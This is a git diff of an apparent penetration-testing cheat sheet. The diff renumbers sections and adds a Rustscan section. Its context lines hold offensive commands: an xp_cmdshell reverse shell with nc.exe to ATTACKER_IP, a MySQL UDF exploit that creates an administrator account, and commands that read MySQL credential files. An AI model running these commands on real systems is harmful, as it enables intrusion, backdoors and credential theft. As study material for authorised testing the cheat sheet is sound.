@@ -12,31 +12,32 @@ Other great cheetsheets:
 - [2. Table of Contents](#2-table-of-contents)
 - [3. Scanning and Enumeration](#3-scanning-and-enumeration)
   - [3.1. Nmap Scanning](#31-nmap-scanning)
-  - [Simple Bash ping scanner](#simple-bash-ping-scanner)
-  - [Simple Bash port scanner](#simple-bash-port-scanner)
-  - [3.2. 25,465,587 - SMTP/s Enumeration](#32-25465587---smtps-enumeration)
-  - [3.3. 53 - DNS Enumeration](#33-53---dns-enumeration)
-    - [3.3.1. DNS Zone Transfer](#331-dns-zone-transfer)
-    - [3.3.2. Bruteforcing DNS Records](#332-bruteforcing-dns-records)
-  - [3.4. 80,443 - Web Enumeration](#34-80443---web-enumeration)
-    - [3.4.1. Web Server Software Enumeration](#341-web-server-software-enumeration)
-    - [3.4.2. Web Directory Scanning](#342-web-directory-scanning)
-    - [3.4.3. Common Web Vuln scanning with Nikto](#343-common-web-vuln-scanning-with-nikto)
-  - [3.5. 88/749 Kerberos Enumeration](#35-88749-kerberos-enumeration)
-  - [3.6. 110,995 - POP Enumeration](#36-110995---pop-enumeration)
-  - [3.7. 111 - RPCbind Enumeration](#37-111---rpcbind-enumeration)
-  - [3.8. 119 - NNTP Enumeration](#38-119---nntp-enumeration)
-  - [3.9. 445 - SMB Enumeration](#39-445---smb-enumeration)
-    - [3.9.1. Listing SMB Shares](#391-listing-smb-shares)
-    - [3.9.2. Interacting on SMB](#392-interacting-on-smb)
-  - [3.10. 1433 - Microsoft SQL Server Enumeration](#310-1433---microsoft-sql-server-enumeration)
-    - [3.10.1. MS SQL Server Command Execution](#3101-ms-sql-server-command-execution)
-  - [3.11. 2049 - NFS Enumeration](#311-2049---nfs-enumeration)
-  - [3.12. 3306 - MySQL Enumeration](#312-3306---mysql-enumeration)
-    - [3.12.1. MySQL UDF Exploit](#3121-mysql-udf-exploit)
-    - [3.12.2. Grabbing MySQL Passwords](#3122-grabbing-mysql-passwords)
-    - [3.12.3. Useful MySQL Files](#3123-useful-mysql-files)
-  - [3.13. 5900 - VNC Enumeration](#313-5900---vnc-enumeration)
+  - [3.2. Rustscan](#32-rustscan)
+  - [3.3. Simple Bash ping scanner](#33-simple-bash-ping-scanner)
+  - [3.4. Simple Bash port scanner](#34-simple-bash-port-scanner)
+  - [3.5. 25,465,587 - SMTP/s Enumeration](#35-25465587---smtps-enumeration)
+  - [3.6. 53 - DNS Enumeration](#36-53---dns-enumeration)
+    - [3.6.1. DNS Zone Transfer](#361-dns-zone-transfer)
+    - [3.6.2. Bruteforcing DNS Records](#362-bruteforcing-dns-records)
+  - [3.7. 80,443 - Web Enumeration](#37-80443---web-enumeration)
+    - [3.7.1. Web Server Software Enumeration](#371-web-server-software-enumeration)
+    - [3.7.2. Web Directory Scanning](#372-web-directory-scanning)
+    - [3.7.3. Common Web Vuln scanning with Nikto](#373-common-web-vuln-scanning-with-nikto)
+  - [3.8. 88/749 Kerberos Enumeration](#38-88749-kerberos-enumeration)
+  - [3.9. 110,995 - POP Enumeration](#39-110995---pop-enumeration)
+  - [3.10. 111 - RPCbind Enumeration](#310-111---rpcbind-enumeration)
+  - [3.11. 119 - NNTP Enumeration](#311-119---nntp-enumeration)
+  - [3.12. 445 - SMB Enumeration](#312-445---smb-enumeration)
+    - [3.12.1. Listing SMB Shares](#3121-listing-smb-shares)
+    - [3.12.2. Interacting on SMB](#3122-interacting-on-smb)
+  - [3.13. 1433 - Microsoft SQL Server Enumeration](#313-1433---microsoft-sql-server-enumeration)
+    - [3.13.1. MS SQL Server Command Execution](#3131-ms-sql-server-command-execution)
+  - [3.14. 2049 - NFS Enumeration](#314-2049---nfs-enumeration)
+  - [3.15. 3306 - MySQL Enumeration](#315-3306---mysql-enumeration)
+    - [3.15.1. MySQL UDF Exploit](#3151-mysql-udf-exploit)
+    - [3.15.2. Grabbing MySQL Passwords](#3152-grabbing-mysql-passwords)
+    - [3.15.3. Useful MySQL Files](#3153-useful-mysql-files)
+  - [3.16. 5900 - VNC Enumeration](#316-5900---vnc-enumeration)
 - [4. Exploitation](#4-exploitation)
   - [4.1. Searchsploit](#41-searchsploit)
   - [4.2. Password Bruteforcing and Cracking](#42-password-bruteforcing-and-cracking)
@@ -133,8 +134,8 @@ Other great cheetsheets:
   - [10.3. Bending with socat](#103-bending-with-socat)
   - [10.4. Bending with rinetd](#104-bending-with-rinetd)
   - [10.5. Bending with netsh](#105-bending-with-netsh)
-  - [Bending with sshuttle](#bending-with-sshuttle)
-  - [Bending with chisel](#bending-with-chisel)
+  - [10.6. Bending with sshuttle](#106-bending-with-sshuttle)
+  - [10.7. Bending with chisel](#107-bending-with-chisel)
 - [11. Miscellaneous](#11-miscellaneous)
   - [11.1. Disable SSH Host Key Checking](#111-disable-ssh-host-key-checking)
   - [11.2. Convert text to Windows UTF-16 format on Linux](#112-convert-text-to-windows-utf-16-format-on-linux)
@@ -148,23 +149,33 @@ If using scripts, you can get script help by `nmap --script-help="nfs-*"`.
 ```sh
 # preferred initial scan:
 # verbose, no DNS resolution, default scripts/enumerate versions/detect OS/traceroute, output all formats
-mkdir -p scans/nmap; cd scans; nmap -v -n -A -oA nmap/initial-scan VICTIM_IP
+VICTIM_IP=VICTIM_IP
+mkdir -p scans/nmap; cd scans; nmap -v -n -A -oA nmap/initial-scan $VICTIM_IP
 
 # all TCP ports, fast discovery, then script scan:
 # verbose, no DNS resolution, fastest timing, all TCP ports, output all formats
-VICTIM=VICTIM_IP
-ports=$(nmap -v -n -T4 --min-rate=1000 -p- --open --reason $VICTIM | grep '^[0-9]' | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
-nmap -n -v -sC -sV -p $ports -oA nmap/tcp-all $VICTIM
+ports=$(nmap -v -n -T4 --min-rate=1000 -p- --open --reason $VICTIM_IP | grep '^[0-9]' | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
+nmap -n -v -sC -sV -p $ports -oA nmap/tcp-all $VICTIM_IP
 
 # top 20 UDP ports
-sudo nmap -n -v -sU --top-ports=20 --reason -oA nmap/udp-top20 -T4 VICTIM_IP
+sudo nmap -n -v -sU --top-ports=20 --reason -oA nmap/udp-top20 -T4 $VICTIM_IP
 
 # specifying safe and wildcard ftp-* scripts
 # logic: and, or, not all work. "," is like "or"
-nmap --script="safe and ftp-*" -v -n -p 21 -oA nmap/safe-ftp VICTIM_IP
+nmap --script="safe and ftp-*" -v -n -p 21 -oA nmap/safe-ftp $VICTIM_IP
 ```
 
-## Simple Bash ping scanner
+## 3.2. Rustscan
+
+Rustscan is a faster way to discover all open ports and autorun Nmap to do the
+script scanning on those ports.
+
+```sh
+VICTIM_IP=VICTIM_IP
+mkdir -p scans/nmap; cd scans; sudo rustscan --ulimit 5000 -a 10.11.1.50 -- -n -A -oA nmap/all-ports
+```
+
+## 3.3. Simple Bash ping scanner
 
 Pings all hosts in a /24 subnet. Provide any IP address in the subnet as arg.
 
@@ -181,7 +192,7 @@ wait $(jobs -rp)
 echo "Done"
 ```
 
-## Simple Bash port scanner
+## 3.4. Simple Bash port scanner
 
 Scans all 65535 ports of a single host. Provide host IP as arg.
 
@@ -196,7 +207,7 @@ wait $(jobs -rp)
 echo "Done"
 ```
 
-## 3.2. 25,465,587 - SMTP/s Enumeration
+## 3.5. 25,465,587 - SMTP/s Enumeration
 
 ```sh
 # Banner grab, command/user enum
@@ -226,7 +237,7 @@ Other ideas:
 
 See [HackTricks](https://book.hacktricks.xyz/pentesting/pentesting-smtp)
 
-## 3.3. 53 - DNS Enumeration
+## 3.6. 53 - DNS Enumeration
 
 **PRO TIP**: Make sure you add the DNS entries you discover to your
 `/etc/hosts` file. Some web servers do redirection based on domain name!
@@ -261,7 +272,7 @@ dig @ns1.domain.tld -t axfr domain.tld
 - `CNAME`: Canonical Name Records are used to create aliases for other host records.
 - `TXT`: Text records can contain any arbitrary data and can be used for various purposes, such as domain ownership verification.
 
-### 3.3.1. DNS Zone Transfer
+### 3.6.1. DNS Zone Transfer
 
 This is basically asking for a copy of all DNS entries served by an authoritative server.
 It lets you get a list of other subdomains that might be of interest.
@@ -278,7 +289,7 @@ dig @ns1.nameserver.tld axfr domain.tld
 host -l domain.tld ns1.nameserver.tld
 ```
 
-### 3.3.2. Bruteforcing DNS Records
+### 3.6.2. Bruteforcing DNS Records
 
 ```sh
 # using dnsrecon
@@ -291,14 +302,14 @@ dnsenum --noreverse -f /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top
 nmap -vv -Pn -T4 -p 53 --script dns-brute domain.tld
 ```
 
-## 3.4. 80,443 - Web Enumeration
+## 3.7. 80,443 - Web Enumeration
 
 Always check:
 - [ ] server software in use (via nmap/whatweb) for vulns.
 - [ ] robots.txt
 - [ ] HTML comments
 
-### 3.4.1. Web Server Software Enumeration
+### 3.7.1. Web Server Software Enumeration
 
 Whatweb shows more details about tech stacks in use by server.
 
@@ -308,23 +319,23 @@ whatweb -v -a3 VICTIM_IP
 
 **PHP 5.x is vulnerable to Shellshock!**
 
-### 3.4.2. Web Directory Scanning
+### 3.7.2. Web Directory Scanning
 
 ```sh
 # Gobuster
-gobuster dir -eku http://VICTIM_IP:8080 -w /usr/share/dirb/wordlists/common.txt -t 50 -x "txt,html,php,asp,aspx,jsp" -o gobuster-common.txt
+gobuster dir -eku http://$VICTIM_IP:8080 -w /usr/share/dirb/wordlists/common.txt -t 50 -x "txt,html,php,asp,aspx,jsp" -o gobuster-common.txt
 # user-agent:
 # -a 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3831.6 Safari/537.36'
 # other good common list: /usr/share/seclists/Discovery/Web-Content/common.txt
 ```
 
-### 3.4.3. Common Web Vuln scanning with Nikto
+### 3.7.3. Common Web Vuln scanning with Nikto
 
 ```sh
 nikto -o nikto.txt -h 10.11.1.123
 ```
 
-## 3.5. 88/749 Kerberos Enumeration
+## 3.8. 88/749 Kerberos Enumeration
 
 ```sh
 # username enumeration with Kerbrute
@@ -350,7 +361,7 @@ Rubeus.exe asreproast /format:john /outfile:hash.txt
 smbclient -L DC_IP -W DOMAIN.tld -U asreproasted-username
 ```
 
-## 3.6. 110,995 - POP Enumeration
+## 3.9. 110,995 - POP Enumeration
 
 Post Office Protocol (POP) retrieves email from a remote mail server.
 
@@ -376,7 +387,7 @@ RETR 1 # retrieve first email
 # try real (root) and fake users to see if there is a difference in error msgs
 ```
 
-## 3.7. 111 - RPCbind Enumeration
+## 3.10. 111 - RPCbind Enumeration
 
 Gets you list of ports open using RPC services. Can be used to locate NFS
 or rusersd services to pentest next.
@@ -391,7 +402,7 @@ rpcinfo -s VICTIM_IP
 rpcinfo -p VICTIM_IP
 ```
 
-## 3.8. 119 - NNTP Enumeration
+## 3.11. 119 - NNTP Enumeration
 
 Network News Transfer Protocol, allows clients to retrieve (read) and post
 (write) news articles to the NNTP (Usenet) server.
@@ -410,7 +421,7 @@ QUIT
 # https://tools.ietf.org/html/rfc977
 ```
 
-## 3.9. 445 - SMB Enumeration
+## 3.12. 445 - SMB Enumeration
 
 Use `enum4linux` or `smbmap` to gather tons of basic info (users, groups,
 shares, etc.)
@@ -440,7 +451,7 @@ enum4linux -aMld VICTIM_IP | tee enum4linux.log
 nmap --script="safe and smb-*" -n -v -p 445 VICTIM_IP
 ```
 
-### 3.9.1. Listing SMB Shares
+### 3.12.1. Listing SMB Shares
 
 ```sh
 # List shares without creds
@@ -450,7 +461,7 @@ smbclient -N -L VICTIM_IP
 smbclient -L VICTIM_IP -W DOMAIN -U svc-admin
 ```
 
-### 3.9.2. Interacting on SMB
+### 3.12.2. Interacting on SMB
 
 ```sh
 # Opens an interactive smb shell that you have creds for
@@ -461,7 +472,7 @@ smb:\> ls  # list files
 smb:\> get filename.txt  # fetch a file
 ```
 
-## 3.10. 1433 - Microsoft SQL Server Enumeration
+## 3.13. 1433 - Microsoft SQL Server Enumeration
 
 Microsoft SQL Server (default port TCP 1433) is a relational database management
 system developed by Microsoft. It supports storing and retrieving data across
@@ -478,7 +489,7 @@ See [Password Bruteforcing and Cracking](#42-password-bruteforcing-and-cracking)
 
 More great tips on [HackTricks](https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server)
 
-### 3.10.1. MS SQL Server Command Execution
+### 3.13.1. MS SQL Server Command Execution
 
 ```sh
 # Log in using service account creds if able
@@ -513,7 +524,7 @@ xp_cmdshell 'c:\users\public\nc.exe -e cmd ATTACKER_IP 443'
 go
 ```
 
-## 3.11. 2049 - NFS Enumeration
+## 3.14. 2049 - NFS Enumeration
 
 ```sh
 # scan with scripts
@@ -543,7 +554,7 @@ sudo groupadd -g 1010 tempgroup
 sudo usermod -a -G tempgroup tempuser
 ```
 
-## 3.12. 3306 - MySQL Enumeration
+## 3.15. 3306 - MySQL Enumeration
 
 MySQL listens on `TCP 3306` by default. You'll see it during a port scan or when
 running `netstat -tnl`.
@@ -617,7 +628,7 @@ use information_schema; select grantee, table_schema, privilege_type from schema
 select user,password,create_priv,insert_priv,update_priv,alter_priv,delete_priv,drop_priv from user where user='OUTPUT OF select user()';
 ```
 
-### 3.12.1. MySQL UDF Exploit
+### 3.15.1. MySQL UDF Exploit
 
 Exploiting User-Defined Functions in MySQL to get shell execution. First,
 ready the UDF library (provides `sys_exec` function) locally on the server.
@@ -670,7 +681,7 @@ SELECT sys_exec("net user hacker P@$$w0rd /add");
 SELECT sys_exec("net localgroup Administrators hacker /add");
 ```
 
-### 3.12.2. Grabbing MySQL Passwords
+### 3.15.2. Grabbing MySQL Passwords
 
 ```sh
 # contains plain-text password of the user debian-sys-maint
@@ -680,7 +691,7 @@ cat /etc/mysql/debian.cnf
 grep -oaE "[-_\.\*a-Z0-9]{3,}" /var/lib/mysql/mysql/user.MYD | grep -v "mysql_native_password"
 ```
 
-### 3.12.3. Useful MySQL Files
+### 3.15.3. Useful MySQL Files
 
 - Configuration Files:
   - Windows
@@ -703,7 +714,7 @@ grep -oaE "[-_\.\*a-Z0-9]{3,}" /var/lib/mysql/mysql/user.MYD | grep -v "mysql_na
   - update.log
   - common.log
 
-## 3.13. 5900 - VNC Enumeration
+## 3.16. 5900 - VNC Enumeration
 
 VNC is a graphical remote desktop sharing system. Other ports involved in it
 are: 5800,5801,5900,5901
@@ -2605,7 +2616,7 @@ netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=33306 conn
 netsh advfirewall firewall add rule name="fwd_4445_rule" protocol=TCP dir=in localip=WIN_EXT_IP localport=4445 action=allow
 ```
 
-## Bending with sshuttle
+## 10.6. Bending with sshuttle
 
 [Sshuttle](https://sshuttle.readthedocs.io/en/stable/usage.html) is a python library that
 handles setting up a combination of IPTABLES rules and SSH proxy tunnels to transparently
@@ -2616,7 +2627,7 @@ route all traffic to a target internal subnet easily.
 sshuttle --dns -r user@jumpbox_ip 10.1.1.0/0
 ```
 
-## Bending with chisel
+## 10.7. Bending with chisel
 
 [Chisel](https://github.com/jpillora/chisel) lets you securely tunnel through
 firewalls and set up a SOCKS proxy through your tunnel.
